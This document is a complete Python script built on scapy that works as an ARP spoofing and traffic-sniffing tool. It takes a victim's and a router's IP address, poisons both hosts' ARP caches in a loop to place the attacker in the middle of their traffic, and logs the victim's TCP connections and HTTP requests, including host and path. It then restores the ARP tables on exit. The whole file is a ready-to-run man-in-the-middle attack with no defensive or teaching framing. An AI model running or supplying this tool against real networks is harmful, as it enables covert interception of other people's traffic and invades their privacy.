from scapy.all import *
import sys
import time
import argparse
from scapy.layers.http import HTTPRequest

def arp_spoof(dest_ip, dest_mac, source_ip):
    my_mac = get_if_hwaddr(conf.iface)
    packet = ARP(op='is-at', hwsrc=my_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    send(packet, verbose=False)

def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    packet = ARP(op='is-at', hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    send(packet, verbose=False)

def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        method = packet[HTTPRequest].Method.decode()
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()

        print(f'{packet["IP"].src}:{packet["TCP"].sport} --> {packet["IP"].dst}:{packet["TCP"].dport}: {method} {url}')
    else: 
        print(f'{packet["IP"].src}:{packet["TCP"].sport} --> {packet["IP"].dst}:{packet["TCP"].dport}')

def main():
    parser = argparse.ArgumentParser(description = 'ARP Spoofer')
    parser.add_argument('--victim-ip', dest='victim', help='The victim\'s IP address', required=True)
    parser.add_argument('--router-ip', dest='router', help='The router\'s IP address', required=True)
    args = parser.parse_args()

    if not args.router or not args.victim:
        parser.print_help()
        sys.exit(-1)

    victim_ip = args.victim
    router_ip = args.router
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)

    sniffer = AsyncSniffer(count=0, filter=f'tcp and host {victim_ip}', store = 0, prn=process_packet)
    sniffer.start()

    try:
        print('Sending spoofed ARP packets')
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip)
            arp_spoof(router_ip, router_mac, victim_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        print('Stopping sniffer...')
        sniffer.stop()
        print('Restoring ARP Tables, this can take a few seconds...')
        time.sleep(3)
        for _ in range(0, 5):
            arp_restore(router_ip, router_mac, victim_ip, victim_mac)
            arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        print('Done. Exiting...')
        sys.exit(0)

if __name__ == '__main__':
    main()